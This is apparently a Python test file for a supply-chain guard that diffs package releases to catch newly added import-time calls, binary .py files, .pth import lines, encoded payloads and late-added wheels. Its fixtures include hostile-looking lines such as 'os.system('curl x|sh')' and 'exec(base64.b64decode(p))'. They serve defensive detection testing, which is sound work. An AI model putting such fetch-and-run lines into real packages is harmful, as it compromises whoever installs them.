"""What is new in a release compared with the one before (run: python3 tests/test_version_diff.py). No network."""
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "guard"))
import version_diff as VD  # noqa: E402

# import-time calls: module level counts (also inside a top-level if), function bodies do not, aliases are resolved
src = """
import subprocess as _sub, os
from urllib.request import urlopen
if os.name == "posix":
    _sub.Popen(["sh", "-c", "x"])
data = urlopen("http://x").read()
exec("from math import *")
def later():
    os.system("never at import")
"""
assert VD.import_time_calls(src) == {"subprocess.Popen", "urllib.request.urlopen"}, VD.import_time_calls(src)
assert VD.import_time_calls("exec(base64.b64decode(p))") == {"builtins.exec"}
assert VD.import_time_calls("exec(:") is None and VD.import_time_calls("x = (") == set()

old = {"pkg/__init__.py": ["import os", "VERSION = '1.0'"], "pkg/util.py": ["def f():", "    return 1"]}
same = dict(old)
assert VD.signals(same, old) == []
hit = VD.signals({**old, "pkg/__init__.py": ["import os", "VERSION = '1.1'", "os.system('curl x | sh')"]}, old)
assert [(h["kind"], h["detail"]) for h in hit] == [("import_time", "os.system")], hit
# the same call already there before is not new
assert VD.signals({"pkg/__init__.py": ["import os", "os.system('a')", "X=2"]}, {"pkg/__init__.py": ["import os", "os.system('a')"]}) == []
# a .py that is a binary, a new .pth with an import line, an encoded payload with something that runs it
assert VD.signals({**old, "pkg/_build.py": ["MZ\x90\x00\x03"]}, old)[0]["kind"] == "binary_py"
assert VD.signals({**old, "pkg-setup.pth": ["import os; os.system('x')"]}, old)[0]["kind"] == "new_pth"
assert VD.signals({**old, "pkg-paths.pth": ["/opt/lib"]}, old) == []                    # a plain path line is normal
blob = "A" * 500
hit = VD.signals({**old, "pkg/util.py": ["def f():", f"    p = '{blob}'", "    open('/tmp/x','wb').write(base64.b64decode(p))"]}, old)
assert [h["kind"] for h in hit] == ["encoded_payload"], hit
# sdist and wheel paths line up
assert VD._match({"pkg/__init__.py": ["x"]}, "pkg/__init__.py") == ["x"]
files = [Path("/t/pkg-1.0.tar.gz.unpacked/pkg-1.0/src/pkg/a.py"), Path("/t/w.whl.unpacked/pkg/tests/test_a.py")]

# check(): fake releases, no network
now = datetime(2026, 10, 15, tzinfo=timezone.utc)


def meta_for(vs_days):
    return {"info": {"version": vs_days[-1][0]},
            "releases": {v: [{"upload_time_iso_8601": (now - timedelta(days=d)).isoformat().replace("+00:00", "Z"), "yanked": False}]
                         for v, d in vs_days}}


CLEAN = {"pkg/__init__.py": ["VERSION = 1"]}
BAD = {"pkg/__init__.py": ["import os", "os.system('curl x|sh')"]}


def fetcher(code_by_version, log):
    def fetch(name, version, meta):
        log.append(version)
        return code_by_version[version]
    return fetch


# 1. this release adds it -> flagged, pin the previous one
log = []
meta = meta_for([("1.0", 400), ("1.1", 200), ("1.2", 1)])
r = VD.check("pkg", "1.2", meta, fetcher({"1.0": CLEAN, "1.1": CLEAN, "1.2": BAD}, log), now=now)
assert r and r["previous"] == "1.1" and r["safe_version"] == "1.1" and r["since"] is None, r
assert sorted(log) == ["1.1", "1.2"]
# 2. nothing new and the previous release is old: two downloads, no look-back
log = []
assert VD.check("pkg", "1.1", meta, fetcher({"1.0": CLEAN, "1.1": CLEAN}, log), now=now) is None and sorted(log) == ["1.0", "1.1"]
# 3. second malicious release in a row: previous had it too, it first appeared 2 days ago -> bisect finds it
log = []
meta = meta_for([(f"1.{i}", 500 - i * 10) for i in range(40)] + [("1.40", 2), ("1.41", 1)])
code = {f"1.{i}": CLEAN for i in range(40)}
code.update({"1.40": BAD, "1.41": BAD})
r = VD.check("pkg", "1.41", meta, fetcher(code, log), now=now)
assert r and r["since"] == {"version": "1.40", "days": 2} and r["safe_version"] == "1.39", r
assert len(log) <= 2 + 7, log                                  # target, previous, then a binary search over 41 releases
# 4. a call that has been there for a long time is the project's normal behaviour
log = []
code = {f"1.{i}": (BAD if i >= 5 else CLEAN) for i in range(42)}
assert VD.check("pkg", "1.41", meta, fetcher(code, log), now=now) is None
# 5. first release, or the target cannot be read: no opinion
assert VD.check("pkg", "1.0", meta_for([("1.0", 1)]), fetcher({"1.0": BAD}, []), now=now) is None
assert VD.check("pkg", "1.1", meta_for([("1.0", 9), ("1.1", 1)]), fetcher({"1.0": CLEAN, "1.1": None}, []), now=now) is None
# pre-releases are not "the previous release" of a final one
meta = meta_for([("2.0", 100), ("2.1rc1", 10), ("2.1", 1)])
assert [v for v, _ in VD.history(meta, "2.1")] == ["2.0"]
print("version_diff: all cases passed")

# a file added to an old release recently
def rel(files):
    return {"upload_time_iso_8601": None} and [{"filename": f, "upload_time_iso_8601": (now - timedelta(days=d)).isoformat().replace("+00:00", "Z"),
                                                "packagetype": "sdist" if f.endswith(".tar.gz") else "bdist_wheel", "yanked": False}
                                               for f, d in files]
meta = {"info": {"version": "1.2.0"}, "releases": {
    "1.1.0": rel([("foo-1.1.0.tar.gz", 900)]),
    "1.2.0": rel([("foo-1.2.0.tar.gz", 800), ("foo-1.2.0-py3-none-any.whl", 3)])}}
r = VD.late_file(meta, "1.2.0", now=now)
assert r and r["file"] == "foo-1.2.0-py3-none-any.whl" and r["added_days_after"] == 797 and r["added_days_ago"] == 3, r
assert r["safe_version"] == "1.1.0" and r["release_date"]
meta["releases"]["1.2.0"] = rel([("foo-1.2.0.tar.gz", 800), ("foo-1.2.0-py3-none-any.whl", 400)])   # backfilled long ago
assert VD.late_file(meta, "1.2.0", now=now) is None
meta["releases"]["1.2.0"] = rel([("foo-1.2.0.tar.gz", 5), ("foo-1.2.0-py3-none-any.whl", 3)])       # same week: normal
assert VD.late_file(meta, "1.2.0", now=now) is None
meta["releases"]["1.2.0"] = rel([("foo-1.2.0.tar.gz", 800), ("foo-1.2.0-cp27-cp27mu-win32.whl", 3)])   # new file pip would not pick
assert VD.late_file(meta, "1.2.0", now=now) is None
print("version_diff: late_file cases passed")

# ML features for the ML model: recorded only; check() fills them when asked, its answer does not change
feats = {}
log = []
meta = meta_for([("1.0", 400), ("1.1", 200), ("1.2", 1)])
r = VD.check("pkg", "1.2", meta, fetcher({"1.0": CLEAN, "1.1": CLEAN, "1.2": BAD}, log), now=now, features_out=feats)
assert r and feats["vd_narrow_import_time"] == 1 and feats["vd_added_os_exec"] == 1 and feats["vd_previous"] == "1.1", feats
assert feats["vd_days_since_previous"] == 199.0 and feats["vd_files_changed"] == 1 and feats["vd_new_api_kinds"] >= 1
feats = {}
assert VD.check("pkg", "1.1", meta, fetcher({"1.0": CLEAN, "1.1": CLEAN}, []), now=now, features_out=feats) is None
assert feats["vd_lines_added"] == 0 and feats["vd_narrow_import_time"] == 0
print("version_diff: feature cases passed")
